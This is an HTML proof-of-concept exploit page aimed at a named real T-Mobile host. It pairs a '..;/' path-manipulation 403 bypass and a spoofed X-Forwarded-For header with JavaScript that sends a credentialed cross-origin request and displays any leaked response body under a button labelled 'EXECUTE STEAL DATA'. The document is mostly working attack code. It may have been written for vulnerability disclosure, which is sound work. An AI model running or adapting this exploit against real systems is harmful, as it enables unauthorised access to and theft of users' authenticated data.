<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>PoC: 403 Bypass & CORS Data Leak</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #f9f9f9; color: #333; padding: 40px; line-height: 1.5; }
        .container { max-width: 850px; margin: auto; background: white; padding: 40px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); border-top: 6px solid #e20074; }
        h1 { color: #e20074; font-size: 24px; margin-bottom: 10px; }
        .meta { font-size: 13px; color: #666; margin-bottom: 30px; border-bottom: 1px solid #eee; padding-bottom: 20px; }
        .input-group { margin-bottom: 20px; }
        label { display: block; font-weight: bold; margin-bottom: 8px; font-size: 14px; }
        input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 6px; font-family: "SFMono-Regular", Consolas, "Liberation Mono", Menlo, monospace; box-sizing: border-box; background: #fafafa; }
        .btn { background: #e20074; color: white; border: none; padding: 16px; width: 100%; border-radius: 6px; font-weight: bold; cursor: pointer; font-size: 16px; transition: 0.2s; }
        .btn:hover { background: #b1005b; }
        #status-box { margin-top: 30px; padding: 20px; border-radius: 8px; background: #f0f0f0; min-height: 100px; }
        .vuln-found { background: #fff5f5 !important; border: 1px solid #feb2b2; color: #c53030; }
        .log-entry { font-family: monospace; font-size: 13px; white-space: pre-wrap; word-break: break-all; }
        .highlight { font-weight: bold; color: #e20074; }
    </style>
</head>
<body>

<div class="container">
    <h1>Vulnerability Proof of Concept</h1>
    <div class="meta">
        <strong>Vulnerability Type:</strong> 403 Forbidden Bypass via Path Manipulation + CORS Misconfiguration<br>
        <strong>Target:</strong> T-Mobile (adn.t-mobile.com)<br>
        <strong>Origin:</strong> <script>document.write(window.location.origin)</script>
    </div>

    <div class="input-group">
        <label>Exploit URL (With Bypass Path):</label>
        <input type="text" id="target" placeholder="https://adn.t-mobile.com/path..;/">
    </div>

    <div class="input-group">
        <label>Custom Header (if required for bypass):</label>
        <input type="text" id="headers" placeholder="X-Forwarded-For: 127.0.0.1">
    </div>

    <button class="btn" onclick="fireExploit()">EXECUTE STEAL DATA</button>

    <div id="status-box">
        <div id="log" class="log-entry">Waiting for execution...</div>
    </div>
</div>

<script>
    async function fireExploit() {
        const url = document.getElementById('target').value;
        const headerStr = document.getElementById('headers').value;
        const log = document.getElementById('log');
        const box = document.getElementById('status-box');
        
        log.innerText = "[*] Sending unauthenticated cross-origin request...\n";

        let customHeaders = { 'Content-Type': 'application/json' };
        if (headerStr.includes(':')) {
            const parts = headerStr.split(':');
            customHeaders[parts[0].trim()] = parts[1].trim();
        }

        try {
            const response = await fetch(url, {
                method: 'POST',
                mode: 'cors',
                credentials: 'include',
                headers: customHeaders,
                body: JSON.stringify({})
            });

            const acao = response.headers.get('Access-Control-Allow-Origin');
            const data = await response.text();

            log.innerText += `[+] Response Status: ${response.status}\n`;
            log.innerText += `[+] ACAO Header: ${acao || 'NOT REFLECTED'}\n\n`;

            if (acao && (acao === "*" || acao.includes(window.location.hostname))) {
                box.classList.add('vuln-found');
                log.innerHTML += `<span class="highlight">[!!!] SUCCESS: SENSITIVE DATA LEAKED</span>\n\n`;
                log.innerText += `Decrypted Body Contents:\n${data.substring(0, 1000)}`;
            } else {
                log.innerText += `[-] CORS policy prevented data reading. Status: ${response.status}`;
            }
        } catch (e) {
            log.innerText += `[!] Error: ${e.message}\n(CORS likely blocked the preflight OPTIONS request)`;
        }
    }
</script>

</body>
</html>
